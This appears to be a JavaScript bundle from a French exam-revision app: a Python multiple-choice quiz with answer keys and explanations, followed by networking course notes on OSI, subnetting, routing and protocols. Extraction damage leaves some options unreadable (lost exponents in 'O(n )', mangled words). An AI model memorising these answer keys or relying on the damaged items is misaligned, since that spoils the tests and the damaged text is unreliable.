10   print ( c2 . id , Compteur . n )`,o:["2 2","2 3","3 3","1 3"],a:1,e:"Réponse : B) 2 3 À chaque création d'instance, Compteur.n est incrémenté et self.id prend la valeur courante. Après c1 : n=1, c1.id=1 | Après c2 : n=2, c2.id=2 | Après c3 : n=3, c3.id=3 c2.id = 2, Compteur.n = 3"},{q:`Quelle est la valeur de s ?

 1   a = {1 , 2 , 3 , 4 , 5}
 2   b = {3 , 4 , 5 , 6 , 7}
 3   s = (a - b) | (b - a)`,o:["{3, 4, 5}","{1, 2, 6, 7}","{1, 2, 3, 4, 5, 6, 7}","{1, 2}"],a:1,e:"Réponse : B) {1, 2, 6, 7} a - b = {1, 2} (dans a mais pas b) b - a = {6, 7} (dans b mais pas a) Union : {1, 2, 6, 7} – C'est la différence symétrique (a b)."},{q:`Quelle est la sortie ?

1   s = " abcdef "
2   print ( s [::2] , s [1::2])`,o:["ace bdf","abc def","abcd ef","adf bce"],a:0,e:`Réponse : A) ace bdf s[::2] : indices 0,2,4 ? 'a','c','e' ? "ace" s[1::2] : indices 1,3,5 ? 'b','d','f ' ? "bdf"`},{q:`Quelle est la valeur de d ?

1   mots = [ " chat " , " chien " , " oiseau " , " chat " ]
2   d = { m : len ( m ) for m in mots }`,o:['{"chat": 4, "chien": 5, "oiseau": 6}','{"chat": [4,4], "chien": 5, "oiseau": 6}','{"chat": 4, "chien": 5, "oiseau": 6, "chat":              4}',"Erreur : clé dupliquée"],a:0,e:'Réponse : A) {"chat": 4, "chien": 5, "oiseau": 6} La compréhension de dict garde la dernière valeur pour une clé dupliquée. "chat" apparaît deux fois avec la même valeur (4), donc le résultat final a 3 clés uniques.'},{q:`Quelle est la sortie ?

1   import numpy as np
2   a = np . array ([1 , 2 , 3 , 4 , 5])
3   b = a [ a > 2]
4   b [0] = 99
5   print ( a )`,o:["[1, 2, 3, 4, 5]","[1, 2, 99, 4, 5]","[99, 2, 3, 4, 5]","[1, 2, 3, 4, 5] avec un avertissement"],a:0,e:"Réponse : A) [1, 2, 3, 4, 5] En NumPy, l'indexation booléenne crée une copie (pas une vue). Modifier b ne modifie pas a. Note : l'indexation par tranche (slice) crée une vue, mais l'indexation booléenne crée toujours une copie. 16 | Examen Blanc 2 – Python Avancé"},{q:`Quelle est la complexité temporelle de cette fonction ?

 1   def f ( lst ) :
 2       result = []
 3       for x in lst :
 4             if x not in result :
 5                   result . append ( x )
 6       return result`,o:["O(n)","O(n log n)","O(n )","O(1)"],a:2,e:"Réponse : C) O(n2 ) La boucle externe est O(n). L'opération x not in result sur une liste est O(n) dans le pire cas. Total : O(n ). Version optimale avec un set : O(n) : 1 def f ( lst ) : 2 seen = set () 3 return [ x for x in lst if not ( x in seen or seen . add ( x ) ) ]"},{q:`Quelle est la sortie ?

 1   class A :
 2       def __init__ ( self ) :
 3             print ( " A " , end = " " )
 5   class B ( A ) :
 6       def __init__ ( self ) :
 7             super () . __init__ ()
 8             print ( " B " , end = " " )
10   class C ( A ) :
11       def __init__ ( self ) :
12             super () . __init__ ()
13             print ( " C " , end = " " )
15   class D (B , C ) :
16       def __init__ ( self ) :
17            super () . __init__ ()
18            print ( " D " , end = " " )




20   D ()`,o:["A B D","A C B D","A B C D","D B C A"],a:1,e:`Réponse : B) A C B D MRO de D : D ? B ? C ? A. super() suit toujours la MRO complète : 1. D.__init__ appelle super() ? B.__init__ 2. B.__init__ appelle super() ? C.__init__ (suit la MRO, pas A !) 3. C.__init__ appelle super() ? A.__init__ 4. A ache "A", C ache "C", B ache "B", D ache "D" Ordre d'achage : A C B D`},{q:`Quelle ligne lève une exception ?

 1   class Temperature :
 2       def __init__ ( self , celsius ) :
 3           self . _c = celsius
 5            @property
 6            def celsius ( self ) :
 7                return self . _c
 9            @celsius . setter
10            def celsius ( self , val ) :
11                if val < -273.15:
12                     raise ValueError ( " Trop froid ! " )
13                self . _c = val
15   t = Temperature (20)
16   t . celsius = 100                   #   ligne   A
17   print ( t . celsius )               #   ligne   B
18   t . celsius = -300                  #   ligne   C
19   print ( t . _c )                    #   ligne   D`,o:["Ligne A","Ligne B","Ligne C","Ligne D"],a:2,e:"Réponse : C) Ligne C t.celsius = -300 appelle le setter avec val=-300 < -273.15 ? raise ValueError. Les lignes A et B sont valides. La ligne D n'est jamais atteinte. Note : t._c est accessible (convention privée non enforced)."},{q:`Quelle est la sortie ?

 1   def g () :
 2       x = yield 1
 3       y = yield x + 10
 4       yield y * 2
 6   gen = g ()
 7   print ( next ( gen ) )
 8   print ( gen . send (5) )
 9   print ( gen . send (3) )`,o:["1, 15, 6","1, 11, 30","1, 10, 6","1, 15, 30"],a:0,e:"Réponse : A) 1, 15, 6 1. next(gen) : démarre le générateur, yield 1 ? ache 1 2. gen.send(5) : x reçoit 5, yield x+10 = 5+10 = 15 ? ache 15 3. gen.send(3) : y reçoit 3, yield y*2 = 3*2 = 6 ? ache 6 send(val) reprend le générateur en assignant val à l'expression yield courante."},{q:`Quelle est la sortie si une exception se produit dans le bloc with ?

 1   class CM :
 2       def __enter__ ( self ) :
 3            print ( " enter " )
 4            return self
 5       def __exit__ ( self , et , ev , tb ) :
 6            print ( " exit " )
 7            return True         # supprime l ' exception
 9   try :
10       with CM () as c :
11              print ( " inside " )
12              raise ValueError ( " oops " )
13       print ( " after with " )
14   except ValueError :
15       print ( " except " )
16   print ( " done " )`,o:["enter, inside, exit, except, done","enter, inside, exit, after with, done","enter, inside, exit, done","enter, inside, except, done"],a:2,e:`Réponse : C) enter, inside, exit, done __exit__ retourne True ? l'exception est supprimée. L'exécution continue après le bloc with sans passer par except. "after with" n'est pas aché car le with se termine après l'exception. "done" est aché car pas d'exception propagée.`},{q:`Après ce code, que retourne df.shape ?

1   import pandas as pd
2   df = pd . DataFrame ({ " A " : [1 ,2 , None ,4] , " B " : [5 , None ,7 ,8]})
3   df2 = df . dropna ()`,o:["(4, 2)","(2, 2)","(3, 2)","(2, 4)"],a:1,e:"Réponse : B) (2, 2) dropna() supprime toutes les lignes contenant au moins un NaN. Ligne 0 : A=1, B=5 (OK) ? Ligne 1 : A=2, B=None ? supprimée Ligne 2 : A=None, B=7 ? supprimée Ligne 3 : A=4, B=8 (OK) ? Résultat : 2 lignes × 2 colonnes ? (2, 2)"},{q:`Quelle est la forme (shape) de c ?

1   import numpy as np
2   a = np . ones ((3 , 1 , 4) )
3   b = np . ones ((1 , 5 , 4) )
4   c = a + b`,o:["(3, 5, 4)","(3, 1, 4)","Erreur de forme","(3, 5, 8)"],a:0,e:`Réponse : A) (3, 5, 4) Règles du broadcasting NumPy : aligner les shapes par la droite, compléter avec 1 si besoin. a: (3, 1, 4) | b: (1, 5, 4) Résultat : max(3,1)=3, max(1,5)=5, max(4,4)=4 ? (3, 5, 4) (Chaque dimension de 1 peut être "broadcastée" à la dimension de l'autre.)`},{q:`Quelle est la sortie ?

 1   def f ( n ) :
 2       if n <= 0:
 3               return 0
 4       return n + f ( n - 2)
 6   print ( f (6) )`,o:["12","9","6","21"],a:0,e:"Réponse : A) 12 Trace de l'exécution : f(6) = 6 + f(4) = 6 + 4 + f(2) = 6 + 4 + 2 + f(0) = 6 + 4 + 2 + 0 = 12"},{q:`Quelle est la sortie ?

 1   def A ( f ) :
 2       print ( " A d ? fini " )
 3       def w (* a ) : print ( " A appel " ) ; return f (* a )
 4       return w
 6   def B ( f ) :
 7       print ( " B d ? fini " )
 8       def w (* a ) : print ( " B appel " ) ; return f (* a )
 9       return w
11   @A
12   @B
13   def hello () :
14       print ( " hello " )
16   hello ()`,o:["B défini, A défini, A appel, B appel, hello","A défini, B défini, A appel, B appel, hello","B défini, A défini, B appel, A appel, hello","A défini, B défini, B appel, A appel, hello"],a:0,e:'Réponse : A) B défini, A défini, A appel, B appel, hello Application des décorateurs (de bas en haut) : 1. @B est appliqué en premier ? ache "B défini" 2. @A est appliqué ensuite ? ache "A défini" Appel de hello() : 1. wrapper de A est appelé ? "A appel", puis appelle wrapper de B 2. wrapper de B est appelé ? "B appel", puis appelle hello original 3. "hello"'},{q:`Quelle instruction consomme le moins de mémoire pour calculer la somme des carrés de 0 à 999
    999 ?`,o:["sum([x**2 for x in range(10**6)])","sum((x**2 for x in range(10**6)))","sum(map(lambda x:  x**2, range(10**6)))","B et C sont équivalents en mémoire"],a:3,e:"Réponse : D) B et C sont équivalents en mémoire  A : crée une liste complète en mémoire ? O(n) mémoire  B : expression génératrice ? produit les valeurs une par une ? O(1)  C : map retourne un itérateur lazy ? O(1) mémoire B et C ont tous les deux une utilisation mémoire O(1). A est le moins ecace en mémoire."},{q:`Lequel est True ?

1   class A : pass
2   class B ( A ) : pass
3   b = B ()`,o:["type(b) == A","type(b) is A","isinstance(b, A)","issubclass(b, A)"],a:2,e:"Réponse : C) isinstance(b, A)  A, B : type(b) est B, pas A ? False  C : isinstance vérifie aussi les classes parentes ? True ?  D : issubclass prend une classe en premier argument, pas une instance ? TypeError"},{q:"Quelle est la complexité de sorted() et list.sort() en Python ?",o:["O(n) en moyenne","O(n log n) dans tous les cas","O(n ) dans le pire cas","O(n log n) en moyenne, O(n ) dans le pire cas"],a:1,e:"Réponse : B) O(n log n) dans tous les cas Python utilise l'algorithme Timsort (hybride merge sort + insertion sort), qui garantit O(n log n) dans tous les cas (meilleur, moyen, pire). C'est une caractéristique importante qui le distingue de quicksort (O(n ) pire cas)."},{q:"Quelle opération est O(1) en Python ?",o:["x in ma_liste (liste de n éléments)","ma_liste.insert(0, x) (insertion en début de liste)","x in mon_set (set de n éléments)","ma_liste.index(x) (recherche dans liste)"],a:2,e:"Réponse : C) x in mon_set  A : recherche dans liste ? O(n)  B : insertion en début de liste ? O(n) (décale tous les éléments)  C : test d'appartenance dans un set ? O(1) (table de hachage) ?  D : recherche par valeur dans liste ? O(n) Opérations O(1) : list.append, list.pop(-1), dict/set lookup, dict/set insert"},{q:`Quelle est la sortie ?

 1   s = " Python "
 2   s [0] = " J "
 3   print ( s )`,o:['"Jython"','"Python"',"TypeError","AttributeError"],a:2,e:`Réponse : C) TypeError Les chaînes Python sont immuables. On ne peut pas modifier un caractère directement. TypeError: 'str' object does not support item assignment Pour modifier : s = "J" + s[1:] ou s = s.replace("P", "J")`},{q:`Quelle est la sortie ?

 1   x = 10
 3   def f () :
 4       x = 20
 5       def g () :
 6              nonlocal x
 7              x = 30
 8       g ()
 9       print ( x )
11   f ()




12   print ( x )`,o:["30, 10","30, 30","20, 10","20, 30"],a:0,e:`Réponse : A) 30, 10  x = 10 : variable globale  Dans f() : x = 20 crée une variable locale à f  nonlocal x dans g() réfère à x de f() (pas la globale)  g() modifie x de f() à 30  print(x) dans f() ? 30  print(x) global ? 10 (non modifié) 17 | Mémo Rapide – Révision de Dernière Minute ➔ Résumé rapide Types et structures Type Création Mutable list [] Oui tuple () Non str "" Non dict {} Oui set set() Oui frozenset frozenset() Non ★ Astuce Concours 10 règles d'or pour le concours : 1. // = division entière, / = réelle, % = modulo, ** = puissance 2. Valeurs falsy : 0, 0.0, "", [], {}, set(), None, False 3. bool est sous-classe de int : True==1, False==0 4. is compare identités, == compare v`}],H2={id:th,name:ih,color:rh,sections:sh,quiz:ah},z2=Object.freeze(Object.defineProperty({__proto__:null,color:rh,default:H2,id:th,name:ih,quiz:ah,sections:sh},Symbol.toStringTag,{value:"Module"})),oh="reseaux",lh="Réseaux",uh="#34d399",ch=[{id:"1.1",c:1,t:"Définitions essentielles",x:`❖ Définition
  Un   réseau informatique est un ensemble d'appareils (ordinateurs, imprimantes, serveurs...)
  interconnectés par des liens de communication pour partager des ressources et échanger des don-
  nées.

  ❖ Définition
  Concepts clés :
   N÷ud : tout dispositif connecté au réseau
   Lien : support de transmission entre n÷uds
   Protocole : ensemble de règles régissant la communication
   Bande passante : capacité maximale de transmission (bit/s)
   Latence : délai de transmission d'un paquet
   Débit : vitesse réelle de transfert de données`},{id:"1.2",c:1,t:"Classification par taille",x:`➔ Résumé rapide Types de réseaux

      Type Portée                Exemple                Tech.
      PAN    Quelques mètres     Bluetooth, USB         Personnel
      LAN    Bâtiment/campus     Ethernet, Wi-Fi        Local
      MAN    Ville               WiMAX, Metro Eth.      Métropolitain
      WAN    Pays/continents     Internet, MPLS         Étendu`},{id:"1.3",c:1,t:"Topologies de réseaux",x:`❖ Définition
  La   topologie décrit l'organisation physique ou logique d'un réseau.

Topologie en Étoile (Star) :                             Collision possible (CSMA/CD)
    Tous reliés à un n÷ud central (switch)
    Panne centrale = panne totale
    La plus utilisée en LAN
    Facile à gérer et étendre
Topologie en Bus :
    Tous sur un même câble                              Historique (Ethernet 10Base2)

                                                                  1.4. MODES DE TRANSMISSION

Topologie en Anneau :                                  Topologie Maillage :
   Données circulent en boucle                           Chaque n÷ud connecté à plusieurs
   Token Ring (IEEE 802.5)                               Très fiable (redondance)
   Une panne coupe le cercle                             Utilisé dans les WAN/Internet

  ★ Astuce Concours
  Pour le concours : la topologie   étoile est la plus courante en LAN aujourd'hui. Le maillage est
  utilisé pour la fiabilité dans les WAN. L'Internet lui-même est une topologie maillage.`},{id:"1.4",c:1,t:"Modes de transmission",x:`➔ Résumé rapide Modes de communication

      Mode          Sens                                 Exemple
      Simplex       Un seul sens                         TV, radio
      Half-duplex   Les deux, mais pas simultanément     Talkie-walkie
      Full-duplex   Les deux simultanément               Téléphone, Ethernet moderne

  2|                 Modèles de Référence : OSI et TCP/IP`},{id:"2.1",c:2,t:"Le modèle OSI (7 couches)",x:`❖ Définition
  Le modèle   OSI (Open Systems Interconnection) défini par l'ISO est un modèle de référence
  théorique à 7 couches qui standardise les fonctions de communication.

                          Couche 7 — Application                                 Message

                          Couche 6 — Présentation                                Message

                          Couche 5 — Session                                     Message

                          Couche 4 — Transport                                   Segment

                          Couche 3 — Réseau                                       Paquet

                          Couche 2 — Liaison de données                           Trame

                          Couche 1 — Physique                                        Bit

                          Couche                                                  PDU

  ➔ Résumé rapide Les 7 couches OSI — mémo :                          Ah Présente Sa Très Sympa
  Liaison Physique
      N Couche             Rôle                            Protocoles
      7    Application     Interface utilisateur           HTTP, FTP, SMTP, DNS
      6    Présentation    Format, chiffrement              SSL/TLS, JPEG, ASCII
      5    Session         Établissement de sessions       NetBIOS, RPC
      4    Transport       Transmission fiable/rapide       TCP, UDP
      3    Réseau          Routage inter-réseaux           IP, ICMP, OSPF, BGP
      2    Liaison         Transfert sur lien local        Ethernet, Wi-Fi, PPP
      1    Physique        Transmission des bits           Fibre, câble, radio

  ★ Astuce Concours
  Mo-yén pour retenir les couches OSI (de bas en haut) :
  « Papa Leo Regarde Tout Son Patrimoine Avec»
  Physique — Liaison — Réseau — Transport — Session — Présentation — Application`},{id:"2.2",c:2,t:"Le modèle TCP/IP (4 couches)",x:`2.2. LE MODÈLE TCP/IP (4 COUCHES)

❖ Définition
Le modèleTCP/IP (ou modèle Internet) est le modèle pratique utilisé sur Internet. Il comporte
4 couches.

➔ Résumé rapide Comparaison OSI vs TCP/IP

 OSI                TCP/IP           Protocoles
 Application (7)                     HTTP, HTTPS, FTP
 Présentation (6)   Application      SMTP, DNS, DHCP
 Session (5)                         SSH, Telnet

 Transport (4)      Transport        TCP, UDP

 Réseau (3)         Internet         IP, ICMP, ARP, OSPF

 Liaison (2)        Accès réseau     Ethernet, Wi-Fi
 Physique (1)       (accès réseau)   câble, fibre, radio

★ Astuce Concours
Encapsulation : à chaque couche descendante, un en-tête est ajouté.
Donnée → Segment (+ en-tête TCP) → Paquet (+ en-tête IP) → Trame (+ en-tête Ethernet)
→ Bits

  3|              Couche Physique et Liaison`},{id:"3.1",c:3,t:"Supports de transmission",x:`➔ Résumé rapide Supports physiques

      Support                Type         Débit max           Utilisation
      Paire torsadée (UTP)   Cat5e        1 Gbps / 100m       LAN standard
      Paire torsadée (STP)   Cat6/6a      10 Gbps / 55m       LAN perf.
      Câble coaxial          —            10 Mbps             TV câble
      Fibre optique MM       850nm        10 Gbps / 550m      Bâtiment
      Fibre optique SM       1310nm       100 Gbps / 40km     WAN/MAN
      Radio (Wi-Fi)          2.4/5 GHz    9.6 Gbps (Wi-Fi6)   Sans-fil

  ❍ Note
  Catégories de câbles UTP à retenir :
         Cat5e : 1 Gbps, 100 m (le plus courant)
         Cat6 : 10 Gbps jusqu'à 55 m
         Cat6a : 10 Gbps jusqu'à 100 m
         Cat7 : 10 Gbps, blindage amélioré`},{id:"3.2",c:3,t:"Formules fondamentales",x:`➣ Formule / Calcul Théorème de Nyquist (canal sans bruit)

                                       Dmax = 2 × B × log2 (M )
  Où : B = bande passante (Hz), M = nombre de niveaux du signal, Dmax = débit max (bps)

  ➣ Formule / Calcul Théorème de Shannon (canal avec bruit)

                                                          S
                                         C = B × log2 1 +
                                                          N
  Où : C = capacité du canal (bps), B = bande passante (Hz), S/N = rapport signal/bruit
  SNR en dB : SN RdB = 10 × log10 NS

  ➤ Exemple
  Bande passante B = 3000 Hz, SNR = 30 dB :
         N
          S
            = 1030/10 = 1000
         C = 3000 × log2 (1001) ≈ 3000 × 9.97 ≈ 29 910 bps ≈ 30 kbps`},{id:"3.3",c:3,t:"Couche Liaison de données",x:`3.3. COUCHE LIAISON DE DONNÉES

  ❖ Définition
  La couche liaison gère le transfert de données entre n÷uds   directement connectés. Elle encap-
  sule les paquets en   trames et gère :
       L'adressage physique (adresse MAC)
       La détection/correction d'erreurs (CRC, paritié)
       Le contrôle de flux et d'accès au médium (CSMA/CD, CSMA/CA)

  ❖ Définition
  Adresse MAC : identifiant physique unique sur 48 bits (6 octets), écrit en hexadécimal.
  Exemple : 00:1A:2B:3C:4D:5E

       Les 3 premiers octets : OUI (Organizationally Unique Identifier) — identifiant du fabricant
       Les 3 derniers octets : numéro d'interface du fabricant
       Adresse FF:FF:FF:FF:FF:FF = adresse de broadcast

  ❖ Définition
  CSMA/CD (Carrier Sense Multiple Access / Collision Detection) :
      1. Écouter le canal avant d'émettre
      2. Transmettre si libre
      3. Détecter les collisions pendant la transmission
      4. Arrêter et attendre un temps aléatoire (backoff exponentiel)
  Utilisé en   Ethernet filaire (semi-duplex). En full-duplex, pas de collision.

  ❍ Note
  CSMA/CA (Collision Avoidance) : utilisé en Wi-Fi (802.11). On ne peut pas détecter les
  collisions en sans-fil, donc on les evite via un mécanisme de backoff aléatoire avant émission.`},{id:"3.4",c:3,t:"Ethernet et commutation",x:`◆ Protocole Ethernet — IEEE 802.3
  Structure d'une trame Ethernet :
         Préambule Dest. MAC Src. MAC Type/Long.                        Données        FCS
           8 octets         6 octets        6 octets       2 octets    46-1500 oct.   4 octets
       FCS (Frame Check Sequence) : CRC pour détection d'erreurs
       Taille min : 64 octets (pour CSMA/CD), max : 1518 octets (MTU = 1500 octets)

  ❖ Définition
  Switch (commutateur) : dispositif de couche 2 qui fait suivre les trames selon la table MAC.
       Apprend les adresses MAC dynamiquement (flooding, forwarding)
       Table MAC (CAM) : association port ↔ adresse MAC
       Crée des domaines de collision séparés (un par port)
       Tous les ports partagent le même domaine de broadcast

                                                                                    3.5. VLANS

  ★ Astuce Concours
  Hub vs Switch vs Routeur :
     Hub : couche 1 — diffuse sur tous les ports (un seul domaine de collision)
     Switch : couche 2 — commute par MAC (domaine collision par port)
     Routeur : couche 3 — route par IP (sépare les domaines de broadcast)`},{id:"3.5",c:3,t:"VLANs",x:`❖ Définition
  Un   VLAN (Virtual LAN) est un réseau logique créé au sein d'un switch pour séparer le trafic
  sans séparation physique.
        Séparation logique du trafic
        Sécurité et performances améliorées
        IEEE 802.1Q : standard de marquage VLAN (tag de 4 octets dans la trame Ethernet)
        Trunk : lien portant plusieurs VLANs (entre switches)
        Access : lien portant un seul VLAN (vers un PC)
        Inter-VLAN routing : nécessite un routeur ou un switch de couche 3

  4|             Couche Réseau — Adressage IP`},{id:"4.1",c:4,t:"Adressage IPv4",x:`❖ Définition
  Une adresse   IPv4 est un identifiant unique de 32 bits (4 octets) assigné à chaque interface réseau.
  Notation décimale pointée : 192.168.1.100

  ➔ Résumé rapide Classes d'adresses IPv4

      Classe Plage 1er octet Masque défaut               N÷uds max Usage
        A     1 — 126             /8 (255.0.0.0)         16 777 214      Grands réseaux
        B     128 — 191           /16 (255.255.0.0)      65 534          Moyens réseaux
        C     192 — 223           /24 (255.255.255.0)    254             Petits réseaux
        D     224 — 239           —                      —               Multicast
        E     240 — 255           —                      —               Réservé

  ❍ Note
  Adresses spéciales :
        127.0.0.1 : loopback (localhost)
        0.0.0.0 : route par défaut / réseau non spécifié
        255.255.255.255 : broadcast limité
        Privées (non routables sur Internet) : 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
        APIPA : 169.254.0.0/16 (auto-configuration sans DHCP)`},{id:"4.2",c:4,t:"Masques et sous-réseaux (CIDR)",x:`❖ Définition
  Lemasque de sous-réseau sépare la partie réseau de la partie hôte d'une adresse IP.
  CIDR (Classless Inter-Domain Routing) : notation /n où n = nombre de bits à 1 dans le masque.

  ➣ Formule / Calcul Calcul de sous-réseau
  Pour un bloc IP/n :
        Nb d'hôtes = 232−n − 2 (on retire adresse réseau et broadcast)
        Adresse réseau : bits hôte tous à 0
        Adresse broadcast : bits hôte tous à 1
        Plage d'hôtes : entre adresse réseau+1 et broadcast-1

  ➤ Exemple Calcul complet pour 192.168.1.130/26

       1. Masque /26 : 26 bits à 1 ⇒ 255.255.255.192
       2. Dernier octet 192 en binaire : 11000000

                                                                                                 4.3. IPV6

       3. 130 en binaire : 10000010
       4. AND : 130   & 192 = 128 ⇒ adresse réseau : 192.168.1.128
       5. Broadcast : 192.168.1.128 + (2 − 1) = 192.168.1.191

       6. Hôtes valides : 192.168.1.129 à 192.168.1.190 (    62 hôtes)

  ➔ Résumé rapide Masques CIDR courants

      CIDR           Masque          Hôtes Sous-réseaux/C           Usage
       /24         255.255.255.0      254              1           Standard
       /25     255.255.255.128        126              2            Semi-C
       /26     255.255.255.192        62               4           Quart-C
       /27     255.255.255.224        30               8                 —
       /28     255.255.255.240        14               16                —
       /29     255.255.255.248         6               32            Petits
       /30     255.255.255.252         2               64         Liaison P2P
       /32     255.255.255.255         1               —          Hôte unique

  ★ Astuce Concours
  Astuce de calcul rapide : pour un masque /n, la partie variable commence à l'octet numero
  ⌈n/8⌉.
      /24 : les 3 premiers octets = réseau, dernier = hôte
      /26 : bloc de 232−26 = 64 adresses par sous-réseau
      Les sous-réseaux /26 dans 192.168.1.0/24 : .0, .64, .128, .192`},{id:"4.3",c:4,t:"IPv6",x:`❖ Définition
  IPv6 : adresses de 128 bits, notation hexadécimale sur 8 groupes de 4 chiffres hex.
  Exemple : 2001:0DB8:0000:0000:0000:FF00:0042:8329
  Abrégé : 2001:DB8::FF00:42:8329

  ➔ Résumé rapide Types d'adresses IPv6

      Type               Préfixe       Equivalent IPv4
      Loopback           ::1/128      127.0.0.1
      Link-local         FE80::/10    169.254.0.0/16
      Unique-local       FC00::/7     RFC1918 (privé)
      Global unicast     2000::/3     Publique
      Multicast          FF00::/8     224.0.0.0/4

  ❍ Note
  En IPv6, il n'y a     pas de broadcast. La découverte de voisins (NDP) remplace ARP.
  Pas de classes, pas de NAT (en théorie). Auto-configuration par SLAAC (EUI-64).

    5|                 Routage`},{id:"5.1",c:5,t:"Principes du routage",x:`❖ Définition
    Le   routage est le processus de sélection du chemin optimal pour acheminer les paquets IP entre
    réseaux.
    Chaque routeur consulte sa        table de routage pour déterminer l'interface de sortie.

    ◆ Protocole Table de routage — exemple

1   Destination / Masque Passerelle                    Interface M {\\ ' e } trique
2   192.168.1.0/24       0.0.0.0                      eth0       1           ( directement
       connect {\\ ' e })
3   10.0.0.0/8           192.168.1.254                eth0               2        ( route statique )
4   0.0.0.0/0            192.168.1.1                  eth0               100      ( route par d {\\ ' e }
       faut )

    Longest Prefix Match (LPM) : le routeur choisit la route avec le masque le plus long.`},{id:"5.2",c:5,t:"Protocoles de routage",x:`➔ Résumé rapide Protocoles de routage

      Protocole Type                       Algorithme        Métrique
      RIP v1/v2        Distance-vecteur    Bellman-Ford      Sauts (max 15)
      OSPF             État de lien        Dijkstra          Coût (bande pass.)
      EIGRP            Hybride (Cisco)     DUAL              Composée
      BGP              Chemin-vecteur      Bellman-Ford      Politique
      ISIS             État de lien        Dijkstra          Coût

    ❖ Définition
    Routage statique vs dynamique :
       Statique : configuré manuellement, pas d'adaptation aux pannes, utilisé dans les petits
             réseaux
          Dynamique : protocoles échangent des informations, adaptation automatique, utilisé dans
             les grands réseaux
    IGP (Interior Gateway Protocol) : OSPF, RIP, EIGRP — utilisés à l'intérieur d'un AS
    EGP (Exterior Gateway Protocol) : BGP — utilisé entre AS (Internet)

    ❍ Note
    RIP : simple mais limité (15 sauts max), convergence lente
    OSPF : plus utilisé en entreprise, convergence rapide, pas de limite de sauts
    BGP : protocole de l'Internet, utilisé entre FAI

                                                                              5.3. ARP ET ICMP`},{id:"5.3",c:5,t:"ARP et ICMP",x:`◆ Protocole ARP — Address Resolution Protocol
  ARP résout une adresse   IP en adresse MAC sur le même réseau local.
      1. Broadcast ARP Request : «Qui a l'IP 192.168.1.1 ?»
      2. Unicast ARP Reply : «C'est moi, mon MAC est XX:XX:XX:XX:XX:XX»
      3. Mis en cache dans la table ARP (temporairement)
  arp -a : ache la table ARP courante.

  ◆ Protocole ICMP — Internet Control Message Protocol
  ICMP transporte des   messages d'erreur et de contrôle au niveau IP.
       Ping : Echo Request (type 8) / Echo Reply (type 0)
       Traceroute : utilise le TTL décrémenté + Time Exceeded (type 11)
       Destination Unreachable (type 3) : port/hôte inaccessible
       Redirect (type 5) : meilleure route disponible

  ★ Astuce Concours
  TTL (Time To Live) : compteur décrémenté à chaque saut. Quand TTL=0, le routeur élimine
  le paquet et envoie un ICMP Time Exceeded. C'est le principe du traceroute. Valeurs typiques
  : Linux=64, Windows=128, Cisco=255.

5.4    NAT

  ❖ Définition
  NAT (Network Address Translation) : traduit les adresses IP privées en adresses publiques.
     Static NAT : 1 IP privée ↔ 1 IP publique
     Dynamic NAT : pool d'IPs publiques
     PAT/NAT Overload : plusieurs IPs privées ↔ 1 IP publique (avec ports différents)
       PAT permet de conserver les adresses IPv4 — utilisé dans tous les routeurs domestiques

  6|            Couche Transport : TCP et UDP`},{id:"6.1",c:6,t:"UDP — User Datagram Protocol",x:`❖ Définition
  UDP est un protocole de transport non connecté (sans établissement de connexion), non fiable
  (pas d'accusé de réception), mais rapide et léger.

  ◆ Protocole En-tête UDP — 8 octets
                          Port source (16 bits)   Port destination (16 bits)
                           Longueur (16 bits)          Checksum (16 bits)
  Utilisations : DNS, DHCP, streaming vidéo, jeux en ligne, VoIP`},{id:"6.2",c:6,t:"TCP — Transmission Control Protocol",x:`❖ Définition
  TCP est un protocole de transport orienté connexion, fiable, avec contrôle de flux et de
  congestion. Il garantit la livraison ordonnée des données.

  ◆ Protocole En-tête TCP — minimum 20 octets
  Champs importants :
       Port source / Port destination (16 bits chacun)
       Numéro de séquence (32 bits)
       Numéro d'accusé (32 bits)
       Flags : SYN, ACK, FIN, RST, PSH, URG
       Fenêtre (window) : contrôle de flux (16 bits)

  ◆ Protocole Three-Way Handshake TCP

  Établissement de connexion :
      1. Client → Serveur : SYN (Seq=x)
      2. Serveur → Client : SYN-ACK (Seq=y, Ack=x+1)
      3. Client → Serveur : ACK (Ack=y+1)
  Terminaison (Four-Way) :
      1. FIN → ACK → FIN → ACK

                                       6.2. TCP — TRANSMISSION CONTROL PROTOCOL

➔ Résumé rapide TCP vs UDP

 Caractéristique TCP                   UDP
 Connexion         Orienté connexion   Sans connexion
 Fiabilité         Garantie (ACK)      Non garantie
 Ordre             Garanti             Non garanti
 Contrôle flux      Oui                 Non
 Vitesse           Plus lent           Plus rapide
 En-tête           20-60 octets        8 octets
 Applications      HTTP, FTP, SSH      DNS, DHCP, streaming

❍ Note
Ports bien connus (0-1023) :

    20/21 : FTP (data/control)                    80 : HTTP
    22 : SSH                                      110 : POP3
    23 : Telnet                                   143 : IMAP
    25 : SMTP                                     443 : HTTPS
    53 : DNS (UDP+TCP)                            3389 : RDP
    67/68 : DHCP

  7|             Couche Application — Protocoles Essentiels`},{id:"7.1",c:7,t:"DNS — Domain Name System",x:`❖ Définition
  DNS traduit les noms de domaine en adresses IP.
  Port 53 (UDP pour les requêtes, TCP pour les transferts de zone).

  ◆ Protocole Types d'enregistrements DNS

      Type      Signification             Exemple
      A         IPv4 address             www.example.com → 93.184.216.34
      AAAA      IPv6 address             www.example.com → 2001:db8::1
      CNAME     Canonical name (alias)   mail.ex.com → www.ex.com
      MX        Mail exchanger           example.com → mail.example.com
      NS        Name server              example.com → ns1.example.com
      PTR       Reverse lookup           34.216.184.93 → www.example.com
      SOA       Start of Authority       Zone primaire
      TXT       Texte libre              SPF, DKIM

  ★ Astuce Concours
  Résolution DNS    récursive vs itérative :
      Récursive : le résolveur fait tout le travail pour le client
      Itérative : chaque serveur renvoie le prochain serveur à consulter
  Ordre de résolution : cache local → fichier hosts → DNS local → racine → TLD → autoritaire`},{id:"7.2",c:7,t:"DHCP — Dynamic Host Configuration Protocol",x:`◆ Protocole DHCP — Port 67 (serveur) / 68 (client)
  Séquence DORA :
       1. Discover : broadcast du client («Y a-t-il un serveur DHCP ?»)
       2. Offer : offre du serveur (IP proposée)
       3. Request : demande du client (accepte l'offre)
       4. Acknowledge : confirmation du serveur (bail accordé)
  Informations fournies : IP, masque, passerelle, DNS, durée du bail`},{id:"7.3",c:7,t:"HTTP et HTTPS",x:`7.3. HTTP ET HTTPS

◆ Protocole HTTP — HyperText Transfer Protocol — Port 80
Méthodes HTTP :
   GET : récupérer une ressource (sans corps)
   POST : envoyer des données (création)
   PUT : remplacer une ressource (modification complète)
   PATCH : modification partielle
   DELETE : supprimer une ressource
   HEAD : même que GET mais sans corps de réponse
Codes de statut HTTP :
